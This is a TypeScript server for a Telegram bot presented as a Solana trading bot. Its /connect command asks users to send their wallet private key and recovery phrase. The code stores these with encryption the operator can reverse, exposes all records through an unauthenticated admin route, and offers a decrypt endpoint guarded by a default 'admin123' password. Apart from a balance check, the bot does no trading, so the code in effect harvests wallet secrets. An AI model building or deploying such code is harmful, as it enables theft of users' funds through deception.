import express from "express";
import { createServer as createViteServer } from "vite";
import path from "path";
import { Telegraf, Context } from "telegraf";
import Database from "better-sqlite3";
import crypto from "crypto";
import * as dotenv from "dotenv";
import { Connection, PublicKey, Keypair } from "@solana/web3.js";
import bs58 from "bs58";
import axios from "axios";

dotenv.config();

const app = express();
const PORT = 3000;
const db = new Database("bot.db");

// --- Database Setup ---
db.exec(`
  CREATE TABLE IF NOT EXISTS users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    telegram_id BIGINT UNIQUE,
    username TEXT,
    wallet_address TEXT,
    recovery_phrase TEXT,
    private_key TEXT,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
  );
  
  CREATE TABLE IF NOT EXISTS trades (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER,
    token TEXT,
    amount REAL,
    price REAL,
    type TEXT,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY(user_id) REFERENCES users(id)
  );
`);

// --- Encryption Logic ---
const ENCRYPTION_KEY = process.env.ENCRYPTION_KEY || "default-32-char-key-for-dev-only!!"; // Must be 32 chars
const IV_LENGTH = 16;

function encrypt(text: string) {
  const iv = crypto.randomBytes(IV_LENGTH);
  const cipher = crypto.createCipheriv("aes-256-cbc", Buffer.from(ENCRYPTION_KEY), iv);
  let encrypted = cipher.update(text);
  encrypted = Buffer.concat([encrypted, cipher.final()]);
  return iv.toString("hex") + ":" + encrypted.toString("hex");
}

function decrypt(text: string) {
  const textParts = text.split(":");
  const iv = Buffer.from(textParts.shift()!, "hex");
  const encryptedText = Buffer.from(textParts.join(":"), "hex");
  const decipher = crypto.createDecipheriv("aes-256-cbc", Buffer.from(ENCRYPTION_KEY), iv);
  let decrypted = decipher.update(encryptedText);
  decrypted = Buffer.concat([decrypted, decipher.final()]);
  return decrypted.toString();
}

// --- Telegram Bot Setup ---
const botToken = process.env.TELEGRAM_BOT_TOKEN;
const bot = new Telegraf(botToken || "DUMMY_TOKEN");

if (botToken) {
  bot.start((ctx) => {
    ctx.reply("Welcome to Solana Trading Bot! Use /connect to link your wallet.");
  });

  bot.command("connect", (ctx) => {
    ctx.reply("Please send your wallet details in the format:\nADDRESS|PRIVATE_KEY|RECOVERY_PHRASE\n\n⚠️ Warning: Your keys will be encrypted and stored securely.");
  });

  bot.on("text", async (ctx) => {
    const text = ctx.message.text;
    if (text.includes("|")) {
      const [address, pKey, recovery] = text.split("|").map(s => s.trim());
      if (!address || !pKey || !recovery) {
        return ctx.reply("Invalid format. Use: ADDRESS|PRIVATE_KEY|RECOVERY_PHRASE");
      }

      try {
        const encryptedPKey = encrypt(pKey);
        const encryptedRecovery = encrypt(recovery);

        const stmt = db.prepare("INSERT OR REPLACE INTO users (telegram_id, username, wallet_address, private_key, recovery_phrase) VALUES (?, ?, ?, ?, ?)");
        stmt.run(ctx.from.id, ctx.from.username || "unknown", address, encryptedPKey, encryptedRecovery);

        ctx.reply("✅ Wallet connected successfully! Your data is encrypted.");
      } catch (err) {
        console.error(err);
        ctx.reply("❌ Error saving wallet details.");
      }
    }
  });

  bot.command("portfolio", async (ctx) => {
    const user = db.prepare("SELECT * FROM users WHERE telegram_id = ?").get(ctx.from.id) as any;
    if (!user) return ctx.reply("Please connect your wallet first using /connect");

    try {
      const connection = new Connection("https://api.mainnet-beta.solana.com");
      const balance = await connection.getBalance(new PublicKey(user.wallet_address));
      ctx.reply(`💰 Portfolio for ${user.wallet_address}:\nSOL Balance: ${balance / 1e9} SOL`);
    } catch (err) {
      ctx.reply("Error fetching balance.");
    }
  });

  bot.launch()
    .then(() => console.log("🚀 Telegram Bot started"))
    .catch(err => console.error("❌ Failed to start Telegram Bot:", err.message));
} else {
  console.warn("⚠️ TELEGRAM_BOT_TOKEN is missing. Bot features are disabled.");
}

// --- Express API Routes ---
app.use(express.json());

app.post("/api/admin/login", (req, res) => {
  const { password } = req.body;
  const expectedPassword = process.env.ADMIN_PASSWORD || "admin123";
  
  console.log(`[Admin] Login attempt. Expected: ${expectedPassword ? 'SET' : 'NOT SET'}`);
  
  if (password === expectedPassword) {
    console.log("[Admin] Login successful");
    res.json({ success: true });
  } else {
    console.warn("[Admin] Login failed: Incorrect password");
    res.status(401).json({ success: false });
  }
});

app.get("/api/admin/users", (req, res) => {
  // Simple auth check (in real app use JWT)
  const users = db.prepare("SELECT * FROM users").all();
  res.json(users);
});

app.post("/api/admin/decrypt", (req, res) => {
  const { encryptedText, password } = req.body;
  if (password !== process.env.ADMIN_PASSWORD) return res.status(401).send("Unauthorized");
  
  try {
    const decrypted = decrypt(encryptedText);
    res.json({ decrypted });
  } catch (err) {
    res.status(400).json({ error: "Decryption failed" });
  }
});

app.get("/api/admin/stats", (req, res) => {
  const userCount = db.prepare("SELECT COUNT(*) as count FROM users").get() as any;
  const tradeCount = db.prepare("SELECT COUNT(*) as count FROM trades").get() as any;
  res.json({ users: userCount.count, trades: tradeCount.count });
});

// --- Vite Middleware ---
async function startServer() {
  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), "dist");
    app.use(express.static(distPath));
    app.get("*", (req, res) => {
      res.sendFile(path.join(distPath, "index.html"));
    });
  }

  app.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on http://localhost:${PORT}`);
  });
}

startServer();
